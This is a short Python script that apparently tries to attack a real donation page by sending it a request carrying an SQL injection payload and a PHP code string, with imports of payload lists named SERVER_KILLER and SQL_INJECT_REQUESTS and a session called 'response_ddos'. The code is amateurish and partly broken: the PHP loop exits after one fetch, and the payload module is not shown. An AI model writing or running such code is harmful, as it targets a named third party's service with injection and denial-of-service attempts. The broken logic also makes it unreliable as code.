from requests import Session 
from payl import SERVER_KILLER, SQL_INJECT_REQUESTS, userahents 
import random, requests 

url = "https://www.donationalerts.com/r/fluke_minecraft"

headers = { 
    'User-Agent': random.choice(userahents),
}

code = """
$maxAttempts = 1000000000000000001; // Максимальное количество попыток

$attempts = 0;
$url = 'https://www.donationalerts.com/r/fluke_minecraft'; // ваш URL

while ($attempts < $maxAttempts) {
    $content = @file_get_contents($url); // @ используется для подавления ошибок

        // Успешно получили содержимое URL
    echo $content; // или делайте что-то с полученным содержимым
    break; // Выходим из цикла

}

if ($attempts == $maxAttempts) {
    echo "Не удалось получить содержимое URL после $attempts попыток";
}

"""

settings = { 
    'code': code, 
    'query': SQL_INJECT_REQUESTS[0]
}

response_ddos = Session() 
ss = response_ddos.options(url=url, headers=headers, data=settings)  
print(ss.text)



